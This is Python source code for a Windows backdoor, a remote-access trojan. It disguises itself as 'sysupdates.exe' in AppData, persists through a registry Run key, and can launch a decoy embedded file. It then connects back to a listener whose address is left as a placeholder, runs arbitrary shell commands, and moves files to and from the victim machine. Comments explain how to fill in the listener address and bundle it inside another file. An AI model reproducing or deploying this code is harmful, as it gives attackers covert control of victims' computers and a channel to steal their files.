import socket
import subprocess as sp
import simplejson
import os
import base64
import time
import shutil
import sys


 
# This function will create an exe on appdata file and will add itself to regedit for to start when system does
def persis():
    new_file = os.environ["AppData"] + "\\sysupdates.exe"

    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d " + new_file
        sp.call(regedit, shell=True)

"""
if this socket will embed in a file, this function helps to do it with CMD command while doing exe with
--add-data "C:\\Users\\User\\File_Path\\;."
"""

def embed():
    embeded_file = sys._MEIPASS + "\\Filename.format"
    sp.Popen(embeded_file, shell=True)


embed()
persis()


class Socket:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.connection.connect((ip, port))
                break
            except socket.error:
                time.sleep(30)

    def execcommand(self, command):
        return sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def cd_command(self, directory):
        os.chdir(directory)
        return "Cd to " + directory

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "DONE"

    def start(self):
        while True:
            command = self.json_recv()
            try:
                if command[0] == "Quit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])
                else:
                    command_output = self.execcommand(command)
            except Exception:
                command_output = "Error!"
            self.json_send(command_output)
        self.connection.close()


backdoor = Socket("ipaddress", PORT)
# you have to write the listener's ipaddress and the port here 
backdoor.start()
